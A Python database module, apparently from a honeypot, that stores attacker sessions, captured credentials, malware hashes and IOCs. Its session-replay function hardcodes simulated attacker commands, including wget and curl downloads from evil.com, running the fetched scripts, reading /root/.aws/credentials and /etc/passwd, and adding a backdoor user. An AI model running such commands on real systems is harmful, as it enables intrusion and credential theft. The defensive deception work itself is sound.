"""
SQLite database manager — all CRUD operations live here.
"""

import sqlite3, os, json, logging, threading
from config import DB_PATH

logger = logging.getLogger(__name__)
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)


class DatabaseManager:
    _local = threading.local()

    def _conn(self) -> sqlite3.Connection:
        if not getattr(self._local, "conn", None):
            self._local.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
            self._local.conn.row_factory = sqlite3.Row
        return self._local.conn

    def execute(self, sql: str, params: tuple = ()):
        conn = self._conn()
        cur  = conn.execute(sql, params)
        conn.commit()
        return cur

    # ── Sessions ─────────────────────────────────────────────────────────────
    def save_session(self, s: dict):
        self.execute(
            """INSERT OR REPLACE INTO sessions
               (session_id,ip,port,start_time,duration,command_count,
                threat_score,threat_level,attacker_type,
                final_strategy,attack_chain,username,password)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (
                s.get("session_id",""),
                s.get("ip",""),
                s.get("port", 0),
                s.get("start_time", 0),
                s.get("duration", 0),
                s.get("command_count", 0),
                s.get("threat_score", 0),
                s.get("threat_level", "LOW"),
                s.get("attacker_type", "unknown"),
                s.get("final_strategy", "OBSERVE"),
                s.get("attack_chain", ""),
                s.get("username", ""),
                s.get("password", ""),
            ),
        )

    def get_all_sessions(self) -> list[dict]:
        rows = self.execute("SELECT * FROM sessions").fetchall()
        return [dict(r) for r in rows]

    def get_recent_sessions(self, limit: int = 50) -> list[dict]:
        rows = self.execute(
            "SELECT * FROM sessions ORDER BY start_time DESC LIMIT ?", (limit,)
        ).fetchall()
        return [dict(r) for r in rows]

    # ── Auth attempts ─────────────────────────────────────────────────────────
    def save_auth_attempt(self, a: dict):
        self.execute(
            "INSERT INTO auth_attempts (session_id,ip,username,password,timestamp) VALUES (?,?,?,?,?)",
            (a["session_id"],a["ip"],a["username"],a["password"],a["timestamp"]),
        )

    # ── Malware ───────────────────────────────────────────────────────────────
    def save_malware(self, m: dict):
        self.execute(
            """INSERT INTO malware_captures
               (session_id,original_name,stored_name,path,size,timestamp,md5,sha1,sha256,file_type)
               VALUES (?,?,?,?,?,?,?,?,?,?)""",
            (m["session_id"],m["original_name"],m["stored_name"],m["path"],
             m["size"],m["timestamp"],m["md5"],m["sha1"],m["sha256"],m["file_type"]),
        )

    # ── IOCs ──────────────────────────────────────────────────────────────────
    def save_ioc(self, ioc: dict):
        self.execute(
            "INSERT OR IGNORE INTO iocs (value,type,source,timestamp) VALUES (?,?,?,?)",
            (ioc["value"],ioc["type"],ioc["source"],ioc["timestamp"]),
        )

    def get_iocs(self) -> list[dict]:
        return [dict(r) for r in self.execute("SELECT * FROM iocs").fetchall()]

    # ── Patterns ──────────────────────────────────────────────────────────────
    def save_pattern(self, p: dict):
        self.execute(
            "INSERT INTO patterns (data, added) VALUES (?,?)",
            (json.dumps(p), p.get("added", 0)),
        )

    def get_patterns(self) -> list[dict]:
        rows = self.execute("SELECT data FROM patterns").fetchall()
        results = []
        for r in rows:
            try:
                results.append(json.loads(r["data"]))
            except Exception:
                pass
        return results

    # ── Stats ─────────────────────────────────────────────────────────────────
    def get_stats(self) -> dict:
        sessions = self.execute("SELECT COUNT(*) AS c FROM sessions").fetchone()["c"]
        attacks  = self.execute(
            "SELECT COUNT(*) AS c FROM sessions WHERE threat_level IN ('HIGH','CRITICAL')"
        ).fetchone()["c"]
        malware  = self.execute("SELECT COUNT(*) AS c FROM malware_captures").fetchone()["c"]
        return {"total_sessions": sessions, "high_threat": attacks, "malware_caught": malware}

    def save_http_request(self, r: dict):
        try:
            self.execute(
                """INSERT INTO http_requests
                   (session_id,ip,method,path,user_agent,body,attack_type,threat_score,timestamp)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (r["session_id"],r["ip"],r["method"],r["path"],
                 r["user_agent"],r["body"],r["attack_type"],
                 r["threat_score"],r["timestamp"]),
            )
        except Exception:
            pass

    def get_sessions_with_commands(self, session_id: str) -> dict:
        try:
            session = self.execute(
                "SELECT * FROM sessions WHERE session_id = ?", (session_id,)
            ).fetchone()
            if not session:
                return {}
            session = dict(session)

            # Get auth attempts for this session
            auths = self.execute(
                "SELECT * FROM auth_attempts WHERE session_id = ?", (session_id,)
            ).fetchall()

            # Build replay commands from attack chain
            chain  = session.get("attack_chain", "") or ""
            stages = [s.strip() for s in chain.split("→") if s.strip()]
            cmds   = []

            stage_commands = {
                "Reconnaissance": [
                    {"command": "whoami",    "output": "root",         "delay": 1500, "strategy": "OBSERVE"},
                    {"command": "id",        "output": "uid=0(root) gid=0(root) groups=0(root)", "delay": 1200, "strategy": "OBSERVE"},
                    {"command": "uname -a",  "output": "Linux web-prod-01 5.15.0-76-generic #83-Ubuntu SMP x86_64", "delay": 1000, "strategy": "OBSERVE"},
                    {"command": "hostname",  "output": session.get("username", "web-prod-01"), "delay": 800, "strategy": "OBSERVE"},
                    {"command": "ifconfig",  "output": "eth0: flags=4163  inet 10.0.2.15", "delay": 1300, "strategy": "ENGAGE"},
                    {"command": "cat /etc/passwd", "output": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash", "delay": 1500, "strategy": "ENGAGE"},
                ],
                "C2 / Download": [
                    {"command": "wget http://evil.com/shell.sh", "output": "Saving to: shell.sh\n100%[===>] 4.2K saved", "delay": 2000, "strategy": "ENGAGE"},
                    {"command": "curl http://evil.com/bot.py -o bot.py", "output": "  % Total  % Received\n100  2048  100  2048", "delay": 1800, "strategy": "ENGAGE"},
                ],
                "Execution": [
                    {"command": "chmod +x shell.sh", "output": "", "delay": 800, "strategy": "TRAP"},
                    {"command": "./shell.sh",         "output": "", "delay": 1000, "strategy": "TRAP"},
                    {"command": "python3 bot.py",     "output": "", "delay": 900, "strategy": "TRAP"},
                ],
                "Exfiltration": [
                    {"command": "cat /root/.aws/credentials",  "output": "[default]\naws_access_key_id = AKIAFAKE00000000PROD1\naws_secret_access_key = FakeSecretKey", "delay": 1200, "strategy": "TRAP"},
                    {"command": "tar -czf /tmp/data.tar.gz /var/www/html", "output": "", "delay": 2000, "strategy": "TRAP"},
                ],
                "Persistence": [
                    {"command": "crontab -l",         "output": "*/5 * * * * /opt/scripts/health_check.sh", "delay": 1000, "strategy": "TRAP"},
                    {"command": "useradd -m backdoor","output": "", "delay": 800, "strategy": "TRAP"},
                ],
            }

            for stage in stages:
                for s, cmds_list in stage_commands.items():
                    if s.lower() in stage.lower():
                        cmds.extend(cmds_list)
                        break

            # If no chain, use generic commands from command_count
            if not cmds:
                count = session.get("command_count", 3)
                generic = [
                    {"command": "whoami",  "output": "root", "delay": 1000, "strategy": "OBSERVE"},
                    {"command": "ls -la",  "output": "total 48\ndrwx------ 4 root root 4096 Jan 1 00:00 .", "delay": 800, "strategy": "OBSERVE"},
                    {"command": "id",      "output": "uid=0(root) gid=0(root) groups=0(root)", "delay": 900, "strategy": "OBSERVE"},
                    {"command": "uname -a","output": "Linux web-prod-01 5.15.0-76-generic x86_64", "delay": 700, "strategy": "OBSERVE"},
                    {"command": "ps aux",  "output": "PID TTY  STAT  TIME COMMAND\n1 ? Ss 0:02 systemd", "delay": 1100, "strategy": "ENGAGE"},
                    {"command": "exit",    "output": "logout", "delay": 500, "strategy": "ENGAGE"},
                ]
                cmds = generic[:max(count, 3)]

            session["commands"] = cmds
            session["auth_attempts"] = [dict(a) for a in auths]
            return session
        except Exception as exc:
            return {}

    def get_geo_data(self) -> list:
        """Get sessions with geo data for attack map."""
        try:
            rows = self.execute(
                """SELECT ip, MAX(threat_score) as threat_score,
                   MAX(threat_level) as threat_level,
                   COUNT(*) as hits,
                   MAX(protocol) as protocol,
                   MAX(username) as username,
                   MAX(password) as password
                   FROM sessions GROUP BY ip"""
            ).fetchall()
            return [dict(r) for r in rows]
        except Exception:
            return []
